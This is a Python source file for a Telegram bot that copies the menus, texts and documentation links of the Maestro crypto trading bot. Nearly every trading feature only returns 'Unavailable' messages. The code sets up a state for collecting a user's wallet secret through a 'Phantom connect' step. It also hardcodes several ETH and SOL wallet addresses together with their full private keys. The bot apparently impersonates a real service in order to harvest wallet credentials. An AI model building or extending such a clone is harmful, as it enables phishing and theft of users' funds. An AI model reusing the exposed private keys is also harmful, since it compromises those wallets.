async def base_wallet(callback: CallbackQuery):
    await callback.answer()
    await callback.message.edit_text("Unavailable At the Moment Please Try again")


CHAIN_GLOBAL_SETTINGS = {}


def get_chain_settings(chain: str) -> dict:
    chain_key = (chain or "sol").lower()
    if chain_key not in CHAIN_GLOBAL_SETTINGS:
        CHAIN_GLOBAL_SETTINGS[chain_key] = {
            "anti_mev": True,
            "degen_mode": False,
            "confirm_manual_buy": False,
            "confirm_manual_sell": False,
            "allow_auto_buy": False,
            "allow_auto_sell": False,
            "duplicate_buy": False,
            "duplicate_sell": False,
            "slippage": 10.0,
            "buy_gas_price": 0.005,
            "price_impact": 20,
            "initial_includes_fees": True,
            "monitor_mode": "Detailed",
            "wallet_selection": "Single",
        }
    return CHAIN_GLOBAL_SETTINGS[chain_key]


def get_chain_display_name(chain: str) -> str:
    return (chain or "SOL").upper()


def get_general_settings_keyboard(chain: str):
    settings = get_chain_settings(chain)
    builder = InlineKeyboardBuilder()
    builder.button(text="ℹ️ Help ↗️", url="https://docs.maestrobots.com/global-settings/buy-settings")
    builder.button(text="🖨️ Print", callback_data=f"print:general:{chain.lower()}")
    builder.button(text="Return", callback_data="global_settings_chains")
    builder.button(text=f"{'🟢' if settings['anti_mev'] else '🔴'} Anti-MEV", callback_data=f"toggle_anti_mev:{chain.lower()}")
    builder.button(text=f"{'🟢' if settings['degen_mode'] else '🔴'} Degen Mode 😈", callback_data=f"toggle_degen_mode:{chain.lower()}")
    builder.button(text="⚙️ Buy", callback_data=f"config_global_buy:{chain.lower()}")
    builder.button(text="⚙️ Sell", callback_data=f"config_global_sell:{chain.lower()}")
    builder.button(text=f"Initial Includes Fees | {'🟢' if settings['initial_includes_fees'] else '🔴'}", callback_data=f"toggle_initial_fees:{chain.lower()}")
    builder.button(text=f"Monitor (All Chains) | {settings['monitor_mode']}", callback_data=f"toggle_monitor_mode:{chain.lower()}")
    builder.button(text=f"Wallet Selection (All Chains) | {settings['wallet_selection']}", callback_data=f"toggle_wallet_selection:{chain.lower()}")
    builder.adjust(3, 2, 2, 1, 1, 1)
    return builder.as_markup()


def get_buy_settings_keyboard(chain: str):
    settings = get_chain_settings(chain)
    builder = InlineKeyboardBuilder()
    builder.button(text="ℹ️ Help ↗️", url="https://docs.maestrobots.com/global-settings/buy-settings")
    builder.button(text="🖨️ Print", callback_data=f"print:buy:{chain.lower()}")
    builder.button(text="Return", callback_data=f"settings_back:{chain.lower()}")
    builder.button(text=f"{'🟢' if settings['confirm_manual_buy'] else '🔴'} Confirm Manual Buy", callback_data=f"toggle_confirm_manual_buy:{chain.lower()}")
    builder.button(text="🔢 Buy KB", callback_data=f"buy_kb:{chain.lower()}")
    builder.button(text=f"Gas Delta | {settings['buy_gas_price']:.3f} Gwei", callback_data=f"buy_gas_delta:{chain.lower()}")
    builder.button(text=f"Price Impact | {settings['price_impact']}%", callback_data=f"price_impact:{chain.lower()}")
    builder.button(text=f"{'🟢' if settings['slippage'] > 0 else '🔴'} Slippage | {settings['slippage']}%", callback_data=f"buy_slippage:{chain.lower()}")
    builder.button(text="🔴 Smart Slippage", callback_data=f"buy_smart_slippage:{chain.lower()}")
    builder.button(text=f"{'🟢' if settings['allow_auto_buy'] else '🔴'} Allow Auto Buy", callback_data=f"toggle_allow_auto_buy:{chain.lower()}")
    builder.button(text=f"{'🟢' if settings['duplicate_buy'] else '🔴'} Duplicate Buy", callback_data=f"toggle_duplicate_buy:{chain.lower()}")
    builder.adjust(3, 2, 2, 1, 1, 2)
    return builder.as_markup()


def get_sell_settings_keyboard(chain: str):
    settings = get_chain_settings(chain)
    builder = InlineKeyboardBuilder()
    builder.button(text="ℹ️ Help ↗️", url="https://docs.maestrobots.com/global-settings/buy-settings")
    builder.button(text="🖨️ Print", callback_data=f"print:sell:{chain.lower()}")
    builder.button(text="Return", callback_data=f"settings_back:{chain.lower()}")
    builder.button(text=f"{'🟢' if settings['confirm_manual_sell'] else '🔴'} Confirm Manual Sell", callback_data=f"toggle_confirm_manual_sell:{chain.lower()}")
    builder.button(text="🔢 Sell KB", callback_data=f"sell_kb:{chain.lower()}")
    builder.button(text=f"Gas Delta | {settings['buy_gas_price']:.3f} Gwei", callback_data=f"sell_gas_delta:{chain.lower()}")
    builder.button(text=f"Price Impact | {settings['price_impact']}%", callback_data=f"price_impact:{chain.lower()}")
    builder.button(text=f"{'🟢' if settings['slippage'] > 0 else '🔴'} Slippage | {settings['slippage']}%", callback_data=f"sell_slippage:{chain.lower()}")
    builder.button(text="🔴 Smart Slippage", callback_data=f"sell_smart_slippage:{chain.lower()}")
    builder.button(text=f"{'🟢' if settings['allow_auto_sell'] else '🔴'} Allow Auto Sell", callback_data=f"toggle_allow_auto_sell:{chain.lower()}")
    builder.button(text=f"{'🟢' if settings['duplicate_sell'] else '🔴'} Duplicate Sell", callback_data=f"toggle_duplicate_sell:{chain.lower()}")
    builder.adjust(3, 2, 2, 1, 1, 2)
    return builder.as_markup()


CALL_CHANNELS = {
    "caesarsgambles": {
        "username": "@caesars_gambles",
        "id": "INSERT_ID",
        "label": "🔴 caesars...",
        "url": "https://t.me/caesars_gambles",
    },
    "madapes": {
        "username": "@mad_apes_call",
        "id": "INSERT_ID",
        "label": "🔴 MadApes",
        "url": "https://t.me/mad_apes_call",
    },
    "madapesgambles": {
        "username": "@mad_apes_gambles",
        "id": "INSERT_ID",
        "label": "🔴 MadApe...",
        "url": "https://t.me/mad_apes_gambles",
    },
    "venomcalls": {
        "username": "@venomcalls",
        "id": "INSERT_ID",
        "label": "🔴 Venom",
        "url": "https://t.me/venomcalls",
    },
    "gubblinscalls": {
        "username": "@gubbinscalls",
        "id": "INSERT_ID",
        "label": "🔴 Gubbins...",
        "url": "https://t.me/gubbinscalls",
    },
    "doxxed": {
        "username": "@DoxxedChannel",
        "id": "INSERT_ID",
        "label": "🔴 Doxxed",
        "url": "https://t.me/DoxxedChannel",
    },
}

CHANNEL_SETTINGS_STATE = {}


def get_signals_settings_keyboard():
    builder = InlineKeyboardBuilder()
    builder.button(text="ℹ️ Help ↗️", url="https://docs.maestrobots.com/signals")
    builder.button(text="Return", callback_data="main_menu")
    builder.button(text="Call Channels", callback_data="signals_call_channels")
    builder.button(text="External Signals", callback_data="signals_external")
    builder.button(text="🔴 Maestro DMs", callback_data="signals_maestro_dms")
    builder.button(text="🟢 Scraper", callback_data="signals_scraper")
    builder.adjust(2, 2, 2)
    return builder.as_markup()


def get_call_channels_keyboard(page: int = 0):
    page = max(0, min(page, 1))
    channel_items = list(CALL_CHANNELS.items())
    start = page * 3
    visible_channels = channel_items[start:start + 3]
    builder = InlineKeyboardBuilder()
    builder.button(text="Search", callback_data="search_channels")
    builder.button(text="Return", callback_data="signals")
    for channel_key, channel in visible_channels:
        builder.button(text=channel["label"], callback_data=f"channel_select:{channel_key}")
    if page > 0:
        builder.button(text="⬅️", callback_data=f"call_channels_page:{page - 1}")
    else:
        builder.button(text="⬅️", callback_data="noop")
    if start + 3 < len(channel_items):
        builder.button(text="➡️", callback_data=f"call_channels_page:{page + 1}")
    else:
        builder.button(text="➡️", callback_data="noop")
    builder.adjust(2, 3, 3, 2)
    return builder.as_markup()


def get_channel_settings_keyboard(channel_key: str):
    channel = CALL_CHANNELS[channel_key]
    builder = InlineKeyboardBuilder()
    builder.button(text=f"{channel['username']} ↗️", url=channel["url"])
    builder.button(text="Return", callback_data="signals_call_channels")
    builder.button(text=f"{'🟢' if CHANNEL_SETTINGS_STATE.get(channel_key, {}).get('active', True) else '🔴'} Active", callback_data=f"toggle_channel_active:{channel_key}")
    builder.button(text=f"{'🟢' if CHANNEL_SETTINGS_STATE.get(channel_key, {}).get('degen', False) else '🔴'} Degen Mode", callback_data=f"toggle_channel_degen:{channel_key}")
    builder.button(text="🖨️ Print", callback_data=f"print_channel:{channel_key}")
    builder.adjust(1, 2, 2)
    return builder.as_markup()


def get_general_settings_text(chain: str) -> str:
    chain_name = get_chain_display_name(chain)
    return (
        f"🔗 <b>{chain_name}</b>\n\n"
        "Customize your general settings. Click on ⚙️ Buy or ⚙️ Sell to customize the settings "
        "of your buys and sells respectively.\n\n"
        "ℹ️ Global Settings are common to all of your connected wallets. They dictate the "
        "settings for your manual trades, and serve as default settings for your automated trades.\n"
        "ℹ️ The settings of your automated trades can be further customized to override your "
        "global settings through dedicated Signals, Copytrade, and Auto Snipe settings."
    )


def get_buy_settings_text(chain: str) -> str:
    chain_name = get_chain_display_name(chain)
    return (
        f"🔗 <b>{chain_name}</b>\n\n"
        "Customize the settings of your buys.\n\n"
        "ℹ️ Enable \"Allow Auto Buy\" to generally allow auto-buys through the bot. This won't trigger any auto-buy unless you manually activate a particular Signal, Copytrade or Auto Snipe.\n"
        "ℹ️ The settings of your automated trades can be further customized to override your global settings through dedicated Signals, Copytrade, and Auto Snipe settings."
    )


def get_sell_settings_text(chain: str) -> str:
    chain_name = get_chain_display_name(chain)
    return (
        f"🔗 <b>{chain_name}</b>\n\n"
        "Customize the settings of your sells.\n\n"
        "ℹ️ Enable \"Allow Auto Sell\" to generally allow auto-sells through the bot. This won't trigger any auto-sell unless you manually activate a particular Signal, Copytrade or Auto Snipe.\n"
        "ℹ️ The settings of your automated trades can be further customized to override your global settings through dedicated Signals, Copytrade, and Auto Snipe settings."
    )


SIGNALS_SETTINGS_TEXT = (
    "Activate signals to auto-buy on received triggers, enable Auto Sell and further customize slippage, gas, multi-wallet buys and limit sell orders through dedicated settings.\n\n"
    "ℹ️ Call Channels: Enable auto-buys for a selection of TG channels.\n"
    "ℹ️ External Signals: Signals requiring external subscription.\n"
    "ℹ️ Maestro DMs: Enable auto-buys on CA pasting.\n"
    "ℹ️ Scraper: Enable auto-buys for scraped addresses through the Maestro Scraper."
)

CALL_CHANNELS_TEXT = "Select the Telegram call channel you would like to subscribe to! 🔔"


def get_print_settings_text(chain: str) -> str:
    chain_name = get_chain_display_name(chain)
    settings = get_chain_settings(chain)
    return (
        f"🔗 {chain_name}\n\n"
        "📍 General\n"
        f"Anti-MEV: {'🟢' if settings['anti_mev'] else '🔴'}\n"
        f"Degen Mode: {'🟢' if settings['degen_mode'] else '🔴'}\n"
        f"Initial Includes Fees: {'🟢' if settings['initial_includes_fees'] else '🔴'}\n"
        "Monitor (All Chains): Detailed\n"
        "Wallet Selection (All Chains): Single\n\n"
        "📌 Buy\n"
        f"Auto Buy: {'🟢' if settings['allow_auto_buy'] else '🔴'}\n"
        f"Duplicate Buy: {'🟢' if settings['duplicate_buy'] else '🔴'}\n"
        f"Buy Gas Price: {settings['buy_gas_price']:.3f} {chain_name}\n"
        "Min MarketCap: Disabled\n"
        "Max MarketCap: Disabled\n"
        "Min Liquidity: Disabled\n"
        "Max Liquidity: Disabled\n"
        "Price Impact Alert: Default (20%)\n"
        f"Slippage: Default ({settings['slippage']}%)\n"
        f"Trade Buy Confirmation: {'🟢' if settings['confirm_manual_buy'] else '🔴'}\n\n"
        "📌 Sell\n"
        "Auto Sell on Manual Buy: 🔴\n"
        "Auto Sell Retry: 🔴\n"
        "Auto PnL Card: 🔴\n"
        "PnL Card - Duration: 🟢\n"
        "PnL Card - Inv. & Payout: 🟢\n"
        "PnL As Video: 🟢\n"
        "Trade Sell Confirmation: 🔴\n"
        f"Sell Gas Price: {settings['buy_gas_price']:.3f} {chain_name}\n"
        "Price Impact Alert: Default (20%)\n"
        f"Slippage: Default ({settings['slippage']}%)\n"
        "Sell Limit Orders:\n\n"
        "⚠️ You have no Sell Limits configured."
    )


async def render_chain_selector(callback: CallbackQuery):
    text = "Select the target chain. You can remove or add missing chains through /chains."
    builder = InlineKeyboardBuilder()
    builder.button(text="SOL", callback_data="gs_chain_sol")
    builder.button(text="BASE", callback_data="gs_chain_base")
    builder.button(text="ETH", callback_data="gs_chain_eth")
    builder.button(text="Return", callback_data="main_menu")
    builder.adjust(3, 1, 1)
    await callback.message.edit_text(text=text, reply_markup=builder.as_markup())


async def render_general_settings_page(callback: CallbackQuery, chain: str):
    chain_name = get_chain_display_name(chain)
    await callback.message.edit_text(
        text=get_general_settings_text(chain_name),
        parse_mode="HTML",
        reply_markup=get_general_settings_keyboard(chain_name),
    )


async def render_buy_settings_page(callback: CallbackQuery, chain: str):
    chain_name = get_chain_display_name(chain)
    await callback.message.edit_text(
        text=get_buy_settings_text(chain_name),
        parse_mode="HTML",
        reply_markup=get_buy_settings_keyboard(chain_name),
    )


async def render_sell_settings_page(callback: CallbackQuery, chain: str):
    chain_name = get_chain_display_name(chain)
    await callback.message.edit_text(
        text=get_sell_settings_text(chain_name),
        parse_mode="HTML",
        reply_markup=get_sell_settings_keyboard(chain_name),
    )


async def render_signals_settings(callback: CallbackQuery):
    await callback.message.edit_text(
        text=SIGNALS_SETTINGS_TEXT,
        parse_mode="HTML",
        reply_markup=get_signals_settings_keyboard(),
    )


async def render_call_channels_menu(callback: CallbackQuery, page: int = 0):
    await callback.message.edit_text(
        text=CALL_CHANNELS_TEXT,
        reply_markup=get_call_channels_keyboard(page),
    )


async def render_channel_settings(callback: CallbackQuery, channel_key: str):
    channel = CALL_CHANNELS[channel_key]
    text = (
        f"{channel['username']} 🔗 SOL\n"
        f"ID: {channel['id']}\n\n"
        "Activate and customize auto-buys triggered by this signal.\n\n"
        "ℹ️ Signal settings are defaulted to your global settings. You can further customize signal settings below to override your global settings.\n"
        "ℹ️ \"Track Only\" will notify you when a signal is received, but it won't automatically buy. If you want to automatically buy when the signal is received, you need to activate the signal."
    )
    await callback.message.edit_text(text=text, reply_markup=get_channel_settings_keyboard(channel_key))


@dp.callback_query(F.data.in_({"global_settings", "global_settings_main", "global_settings_chains"}))
async def process_global_settings_menu(callback: CallbackQuery):
    await render_chain_selector(callback)
    await callback.answer()


@dp.callback_query(F.data.startswith("gs_chain_"))
async def process_global_settings_chain(callback: CallbackQuery):
    chain = callback.data.split("_", 2)[-1].upper()
    await render_general_settings_page(callback, chain)
    await callback.answer()


@dp.callback_query(F.data.startswith("help:"))
async def process_help(callback: CallbackQuery):
    parts = callback.data.split(":")
    page = parts[1] if len(parts) > 1 else "general"
    link = "https://docs.maestrobots.com/global-settings/general-settings" if page == "general" else "https://docs.maestrobots.com/global-settings/buy-settings"
    await callback.answer(url=link)


@dp.callback_query(F.data.startswith("print:"))
async def process_print(callback: CallbackQuery):
    parts = callback.data.split(":")
    chain = (parts[2] if len(parts) > 2 else "sol").upper()
    await callback.message.answer(get_print_settings_text(chain))
    await callback.answer()


@dp.callback_query(F.data.startswith("toggle_anti_mev:"))
async def toggle_anti_mev(callback: CallbackQuery):
    chain = callback.data.split(":", 1)[1].upper()
    settings = get_chain_settings(chain)
    settings["anti_mev"] = not settings["anti_mev"]
    await render_general_settings_page(callback, chain)
    await callback.answer()


@dp.callback_query(F.data.startswith("toggle_degen_mode:"))
async def toggle_degen_mode(callback: CallbackQuery):
    chain = callback.data.split(":", 1)[1].upper()
    settings = get_chain_settings(chain)
    settings["degen_mode"] = not settings["degen_mode"]
    await render_general_settings_page(callback, chain)
    await callback.answer()


@dp.callback_query(F.data.startswith("config_global_buy:"))
async def process_buy_settings(callback: CallbackQuery):
    chain = callback.data.split(":", 1)[1].upper()
    await render_buy_settings_page(callback, chain)
    await callback.answer()


@dp.callback_query(F.data.startswith("config_global_sell:"))
async def process_sell_settings(callback: CallbackQuery):
    chain = callback.data.split(":", 1)[1].upper()
    await render_sell_settings_page(callback, chain)
    await callback.answer()


@dp.callback_query(F.data.startswith("toggle_initial_fees:"))
async def toggle_initial_fees(callback: CallbackQuery):
    chain = callback.data.split(":", 1)[1].upper()
    settings = get_chain_settings(chain)
    settings["initial_includes_fees"] = not settings["initial_includes_fees"]
    await render_general_settings_page(callback, chain)
    await callback.answer()


@dp.callback_query(F.data.startswith("toggle_monitor_mode:"))
async def toggle_monitor_mode(callback: CallbackQuery):
    chain = callback.data.split(":", 1)[1].upper()
    settings = get_chain_settings(chain)
    settings["monitor_mode"] = "Detailed" if settings["monitor_mode"] != "Detailed" else "Basic"
    await render_general_settings_page(callback, chain)
    await callback.answer()


@dp.callback_query(F.data.startswith("toggle_wallet_selection:"))
async def toggle_wallet_selection(callback: CallbackQuery):
    chain = callback.data.split(":", 1)[1].upper()
    settings = get_chain_settings(chain)
    settings["wallet_selection"] = "Single" if settings["wallet_selection"] != "Single" else "Multiple"
    await render_general_settings_page(callback, chain)
    await callback.answer()


@dp.callback_query(F.data.startswith("settings_back:"))
async def return_to_general_settings(callback: CallbackQuery):
    chain = callback.data.split(":", 1)[1].upper()
    await render_general_settings_page(callback, chain)
    await callback.answer()


@dp.callback_query(F.data.startswith("toggle_confirm_manual_buy:"))
async def toggle_confirm_manual_buy(callback: CallbackQuery):
    chain = callback.data.split(":", 1)[1].upper()
    settings = get_chain_settings(chain)
    settings["confirm_manual_buy"] = not settings["confirm_manual_buy"]
    await render_buy_settings_page(callback, chain)
    await callback.answer()


@dp.callback_query(F.data.startswith("toggle_confirm_manual_sell:"))
async def toggle_confirm_manual_sell(callback: CallbackQuery):
    chain = callback.data.split(":", 1)[1].upper()
    settings = get_chain_settings(chain)
    settings["confirm_manual_sell"] = not settings.get("confirm_manual_sell", False)
    await render_sell_settings_page(callback, chain)
    await callback.answer()


@dp.callback_query(F.data.startswith("buy_kb:"))
async def buy_kb_unavailable(callback: CallbackQuery):
    await callback.answer(popup_alert("Unavailable!", "Add a wallet first.", "/start"), show_alert=True)


@dp.callback_query(F.data.startswith("sell_kb:"))
async def sell_kb_unavailable(callback: CallbackQuery):
    await callback.answer(popup_alert("Unavailable!", "Add a wallet first.", "/start"), show_alert=True)


@dp.callback_query(F.data.startswith("buy_gas_delta:"))
async def buy_gas_delta_prompt(callback: CallbackQuery, state: FSMContext):
    parts = callback.data.split(":")
    chain = parts[-1].upper()
    prompt = await callback.message.answer(
        "Reply to this message with your desired gas value in SOL for the buy order.\n\nExample: 0.005",
        reply_markup=types.ForceReply(selective=True),
    )
    await state.set_state(BotStates.waiting_for_gas)
    await state.update_data(panel_id=callback.message.message_id, prompt_id=prompt.message_id, chain=chain, keyboard_type="settings_buy")
    await callback.answer()


@dp.callback_query(F.data.startswith("sell_gas_delta:"))
async def sell_gas_delta_prompt(callback: CallbackQuery, state: FSMContext):
    parts = callback.data.split(":")
    chain = parts[-1].upper()
    prompt = await callback.message.answer(
        "Reply to this message with your desired gas value in SOL for the sell order.\n\nExample: 0.005",
        reply_markup=types.ForceReply(selective=True),
    )
    await state.set_state(BotStates.waiting_for_gas)
    await state.update_data(panel_id=callback.message.message_id, prompt_id=prompt.message_id, chain=chain, keyboard_type="settings_sell")
    await callback.answer()


@dp.callback_query(F.data.startswith("price_impact:"))
async def price_impact_unavailable(callback: CallbackQuery):
    await callback.answer(popup_alert("Unavailable!", "This setting is not ready yet.", "/start"), show_alert=True)


@dp.callback_query(F.data.startswith("buy_slippage:"))
async def buy_slippage_prompt(callback: CallbackQuery, state: FSMContext):
    parts = callback.data.split(":")
    chain = parts[-1].upper()
    prompt = await callback.message.answer(
        "Reply to this message with your desired slippage percentage for the buy order. Minimum is 0.1%. Max is 1000%!",
        reply_markup=types.ForceReply(selective=True),
    )
    await state.set_state(BotStates.waiting_for_global_slippage)
    await state.update_data(panel_id=callback.message.message_id, prompt_id=prompt.message_id, chain=chain, keyboard_type="settings_buy")
    await callback.answer()


@dp.callback_query(F.data.startswith("sell_slippage:"))
async def sell_slippage_prompt(callback: CallbackQuery, state: FSMContext):
    parts = callback.data.split(":")
    chain = parts[-1].upper()
    prompt = await callback.message.answer(
        "Reply to this message with your desired slippage percentage for the sell order. Minimum is 0.1%. Max is 1000%!",
        reply_markup=types.ForceReply(selective=True),
    )
    await state.set_state(BotStates.waiting_for_global_slippage)
    await state.update_data(panel_id=callback.message.message_id, prompt_id=prompt.message_id, chain=chain, keyboard_type="settings_sell")
    await callback.answer()


@dp.message(BotStates.waiting_for_global_slippage)
async def process_global_slippage_input(message: Message, state: FSMContext):
    state_data = await state.get_data()
    panel_id = state_data.get("panel_id")
    prompt_id = state_data.get("prompt_id")
    chain = state_data.get("chain", "SOL")

    try:
        await message.bot.delete_message(chat_id=message.chat.id, message_id=prompt_id)
    except Exception:
        pass

    try:
        await message.delete()
    except Exception:
        pass

    clean_value = (message.text or "").replace("%", "").strip()
    try:
        numeric_value = float(clean_value)
    except ValueError:
        await message.answer("❌ Invalid slippage. Please enter a number from 0.1 to 1000.")
        await state.clear()
        return

    if not (0.1 <= numeric_value <= 1000):
        await message.answer("❌ Invalid slippage. Please enter a number from 0.1 to 1000.")
        await state.clear()
        return

    settings = get_chain_settings(chain)
    settings["slippage"] = numeric_value

    if panel_id:
        try:
            keyboard_type = state_data.get("keyboard_type", "settings_buy")
            if keyboard_type == "settings_sell":
                reply_markup = get_sell_settings_keyboard(chain)
            elif keyboard_type == "monitor":
                reply_markup = get_monitor_keyboard(message.from_user.id, state_data.get("mint_address") or "")
            elif keyboard_type == "trading":
                reply_markup = get_trading_keyboard(message.from_user.id)
            else:
                reply_markup = get_buy_settings_keyboard(chain)
            await message.bot.edit_message_reply_markup(
                chat_id=message.chat.id,
                message_id=panel_id,
                reply_markup=reply_markup,
            )
        except Exception:
            pass

    await state.clear()


@dp.callback_query(F.data.startswith("buy_smart_slippage:"))
async def buy_smart_slippage_noop(callback: CallbackQuery):
    await callback.answer()


@dp.callback_query(F.data.startswith("sell_smart_slippage:"))
async def sell_smart_slippage_noop(callback: CallbackQuery):
    await callback.answer()


@dp.callback_query(F.data.startswith("toggle_allow_auto_buy:"))
async def toggle_allow_auto_buy(callback: CallbackQuery):
    chain = callback.data.split(":", 1)[1].upper()
    settings = get_chain_settings(chain)
    settings["allow_auto_buy"] = not settings["allow_auto_buy"]
    await render_buy_settings_page(callback, chain)
    await callback.answer()


@dp.callback_query(F.data.startswith("toggle_allow_auto_sell:"))
async def toggle_allow_auto_sell(callback: CallbackQuery):
    chain = callback.data.split(":", 1)[1].upper()
    settings = get_chain_settings(chain)
    settings["allow_auto_sell"] = not settings.get("allow_auto_sell", False)
    await render_sell_settings_page(callback, chain)
    await callback.answer()


@dp.callback_query(F.data.startswith("toggle_duplicate_buy:"))
async def toggle_duplicate_buy(callback: CallbackQuery):
    chain = callback.data.split(":", 1)[1].upper()
    settings = get_chain_settings(chain)
    settings["duplicate_buy"] = not settings["duplicate_buy"]
    await render_buy_settings_page(callback, chain)
    await callback.answer()


@dp.callback_query(F.data.startswith("toggle_duplicate_sell:"))
async def toggle_duplicate_sell(callback: CallbackQuery):
    chain = callback.data.split(":", 1)[1].upper()
    settings = get_chain_settings(chain)
    settings["duplicate_sell"] = not settings.get("duplicate_sell", False)
    await render_sell_settings_page(callback, chain)
    await callback.answer()


@dp.callback_query(F.data.startswith("auto_buy_checks:"))
async def auto_buy_checks_unavailable(callback: CallbackQuery):
    await callback.answer(popup_alert("Unavailable!", "Try again shortly.", "/start"), show_alert=True)


@dp.callback_query(F.data.startswith("toggle_channel_active:"))
async def toggle_channel_active(callback: CallbackQuery):
    channel_key = callback.data.split(":", 1)[1]
    state = CHANNEL_SETTINGS_STATE.setdefault(channel_key, {})
    state["active"] = not state.get("active", True)
    await render_channel_settings(callback, channel_key)
    await callback.answer()


@dp.callback_query(F.data.startswith("toggle_channel_degen:"))
async def toggle_channel_degen(callback: CallbackQuery):
    channel_key = callback.data.split(":", 1)[1]
    state = CHANNEL_SETTINGS_STATE.setdefault(channel_key, {})
    state["degen"] = not state.get("degen", False)
    await render_channel_settings(callback, channel_key)
    await callback.answer()


@dp.callback_query(F.data.startswith("print_channel:"))
async def print_channel(callback: CallbackQuery):
    channel_key = callback.data.split(":", 1)[1]
    channel = CALL_CHANNELS[channel_key]
    await callback.message.answer(f"Channel: {channel['username']}\nID: {channel['id']}")
    await callback.answer()


@dp.callback_query(F.data.startswith("auto_sell_checks:"))
async def auto_sell_checks_unavailable(callback: CallbackQuery):
    await callback.answer(popup_alert("Unavailable!", "Try again shortly.", "/start"), show_alert=True)


@dp.callback_query(F.data.startswith("auto_buy_settings:"))
async def auto_buy_settings_unavailable(callback: CallbackQuery):
    await callback.answer("Unavailable at the Moment", show_alert=True)


@dp.callback_query(F.data.startswith("auto_sell_settings:"))
async def auto_sell_settings_unavailable(callback: CallbackQuery):
    await callback.answer(popup_alert("Unavailable!", "This feature is not ready yet.", "/start"), show_alert=True)


# --- Configuration & States ---
USER_CONFIGS = {}
TRACKED_MONITORS = {}


def get_user_data(user_id):
    if user_id not in USER_CONFIGS:
        USER_CONFIGS[user_id] = {"slippage": "10%", "gas": "0.005 SOL"}
    return USER_CONFIGS[user_id]


# Track network enable/disable status for chain toggles
network_status = {
    "SOL": False,
    "BASE": False,
    "ETH": False,
}

# --- STATE DEFINITIONS ---
class SupportForm(StatesGroup):
    waiting_for_input = State()

class WalletSetupState(StatesGroup):
    waiting_for_name = State()

class PhantomConnectState(StatesGroup):
    waiting_for_wallet_secret = State()

used_wallet_names = set()

wallet_inventory = {
    "ETH": [
        {"address": "0x3C2608BEfaf57F015763D4b2Fc412450428bd813", "pk": "0x2833ba265cc2ba3cd8e453ce987f85e82dc58749c7c1199805c1861a9e611438"},
        {"address": "0xfa018ab34440E5c0d46bFE3D67773633874a7DEC", "pk": "0x52b270cff50ed7de3127896fea2cd660cb6355b500d7c95efa78e7cbd3dd5688"},
        {"address": "0x67820851500BE9Fb567A270fD720866A0B7f1128", "pk": "0x45334d360fd63afd408e0c1d4664d1edd403b3583709374641b52fb62c268f82"},
    ],
    "SOL": [
        {"address": "BpuWeZN1ryJbeSadkXVVA7cvUrwVwQ9GuwLrai7PgxNK", "pk": "5qf8nqjxzCWHvViQfg7eNJiuhqAgVKgK1ENpVBpEF4WQWM4bgMFFkRWcwyY2pumA1b5ELtBZxnAGRtBCjr7UGXro"},
        {"address": "E6uvBerzdCPMjhoVFDzKLTQgKKXNAEQ6viS9Ys2n34g3", "pk": "2vBNET7ghB88JHbywx74MgBEyjYko3QMBn6VbnbeGLgtnKLMejTMR9DhV2ZunAp8BXAun3BPQynG7rfgRB9jRSCb"},
        {"address": "HjkeWQX5iBZXYpsPbxXevBddRzqr1g8BpCwZvVr1Vw8e", "pk": "32YbJMF5bPs6d7MzLAyJuWr9Ye3ewpZZdYLJCY4JMfUk8KGrcdsUeGi3dcvWBP9LhkervL37G3VR4HLevcisiHmt"},
    ],
}
assigned_wallets = {}
user_wallets = {}


def get_next_wallet(chain: str):
    return None


def get_generation_error_keyboard(user_id=None):
    return InlineKeyboardMarkup(inline_keyboard=[
        [
            InlineKeyboardButton(text=get_localized_button_text(user_id or 0, "ℹ️ Help"), url="https://docs.maestrobots.com/wallet-setup"),
            InlineKeyboardButton(text=get_localized_button_text(user_id or 0, "Return"), callback_data="chains")
        ]
    ])


def get_wallet_created_keyboard(user_id=None):
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=get_localized_button_text(user_id or 0, "💳 Track wallet"), callback_data="track_wallet")]
    ])

# --- REUSABLE KEYBOARD BUILDERS ---

def get_main_keyboard(user_id=None):
    return InlineKeyboardMarkup(inline_keyboard=[
        [
            InlineKeyboardButton(text=get_localized_button_text(user_id or 0, "🔗 Chains"), callback_data="chains"),
            InlineKeyboardButton(text=get_localized_button_text(user_id or 0, "🇺🇸🇨🇳 Language"), callback_data="language")
        ],
        [
            InlineKeyboardButton(text=get_localized_button_text(user_id or 0, "💳 Wallets"), callback_data="wallets"),
            InlineKeyboardButton(text=get_localized_button_text(user_id or 0, "⚙️ Global Settings"), callback_data="global_settings_chains")
        ],
        [
            InlineKeyboardButton(text=get_localized_button_text(user_id or 0, "📡 Signals"), callback_data="signals"),
            InlineKeyboardButton(text=get_localized_button_text(user_id or 0, "🧑‍🤝‍🧑 Copytrade"), callback_data="copytrade")
        ],
        [
            InlineKeyboardButton(text=get_localized_button_text(user_id or 0, "🕓 Active Orders"), callback_data="active_orders"),
            InlineKeyboardButton(text=get_localized_button_text(user_id or 0, "📈 Positions"), callback_data="positions")
        ],
        [
            InlineKeyboardButton(text=get_localized_button_text(user_id or 0, "🎯 Auto Snipe"), callback_data="auto_snipe"),
            InlineKeyboardButton(text=get_localized_button_text(user_id or 0, "↔️ Bridge"), callback_data="bridge")
        ],
        [
            InlineKeyboardButton(text=get_localized_button_text(user_id or 0, "⭐️ Premium"), callback_data="premium"),
            InlineKeyboardButton(text=get_localized_button_text(user_id or 0, "💸 Cashback"), callback_data="cashback"),
            InlineKeyboardButton(text=get_localized_button_text(user_id or 0, "💰 Referral"), callback_data="referral")
        ],
        [
            InlineKeyboardButton(text=get_localized_button_text(user_id or 0, "⚡️ BUY & SELL NOW!"), callback_data="buy_sell_now")
        ]
    ])

def get_chains_keyboard(user_id=None):
    # Build dynamically based on current green/red toggle state for SOL, BASE, and ETH
    sol_icon = "🟢" if network_status["SOL"] else "🔴"
    base_icon = "🟢" if network_status["BASE"] else "🔴"
    eth_icon = "🟢" if network_status["ETH"] else "🔴"

    sol_label = get_localized_button_text(user_id or 0, "💳 Wallets") if network_status["SOL"] else get_localized_button_text(user_id or 0, "💳 No Wallets!")
    base_label = get_localized_button_text(user_id or 0, "💳 Wallets") if network_status["BASE"] else get_localized_button_text(user_id or 0, "💳 No Wallets!")
    eth_label = get_localized_button_text(user_id or 0, "💳 Wallets") if network_status["ETH"] else get_localized_button_text(user_id or 0, "💳 No Wallets!")

    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=f"{sol_icon} SOL", callback_data="toggle_sol"), InlineKeyboardButton(text=sol_label, callback_data="wallet_select_sol")],
        [InlineKeyboardButton(text=f"{base_icon} BASE", callback_data="toggle_base"), InlineKeyboardButton(text=base_label, callback_data="wallet_select_base")],
